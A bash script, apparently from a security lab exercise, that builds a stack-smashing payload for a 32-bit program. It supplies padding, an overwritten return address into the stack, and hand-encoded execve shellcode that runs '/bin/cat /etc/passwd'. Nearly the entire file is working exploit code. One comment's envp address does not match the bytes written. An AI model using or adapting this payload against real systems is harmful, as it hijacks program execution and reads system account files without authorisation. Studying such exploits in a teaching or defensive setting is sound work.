#!/bin/bash

# write 12 'A's to buff and its padding
perl -e 'print "A"x12;' > input.catpass.txt

# write value 0xbfffefc8 to the saved EBP, to preserve the old EBP (actually not necessary)
perl -e 'print "\xc8\xef\xff\xbf";' >> input.catpass.txt 

# write new return address 0xbfffefe4
perl -e 'print "\xe4\xef\xff\xbf";' >> input.catpass.txt

# write "/bin/cat" and one \0 and three padding to stack
perl -e 'print "/bin/cat\0\x00\x00\x00";' >> input.catpass.txt

# write "/etc/passwd" and one \0 to stack
perl -e 'print "/etc/passwd\0";' >> input.catpass.txt

# write "/bin/cat"'s address to stack
perl -e 'print "\xc0\xef\xff\xbf";' >> input.catpass.txt

# write "/etc/passwd"'s address to stack
perl -e 'print "\xcc\xef\xff\xbf";' >> input.catpass.txt

# write a NULL pointer to stack
perl -e 'print "\x00\x00\x00\x00";' >> input.catpass.txt

# inject "xorl %eax, %eax"
perl -e 'print "\x31\xc0";' >> input.catpass.txt

# inject "movl $0xb, %eax"
# execve syscall number 11
perl -e 'print "\xb0\x0b";' >> input.catpass.txt

# inject "movl $0xbfffefc0,%ebx"
# argument - filename
perl -e 'print "\xbb\xc0\xef\xff\xbf";' >> input.catpass.txt

# inject "movl $0xbfffefd8,%ecx"
# argument - argv[]
perl -e 'print "\xb9\xd8\xef\xff\xbf";' >> input.catpass.txt

# inject "movl $0xbffffe80,%edx"
# argument - envp 
perl -e 'print "\xba\xe0\xef\xff\xbf";' >> input.catpass.txt

# inject "int $0x80"
perl -e 'print "\xcd\x80";' >> input.catpass.txt
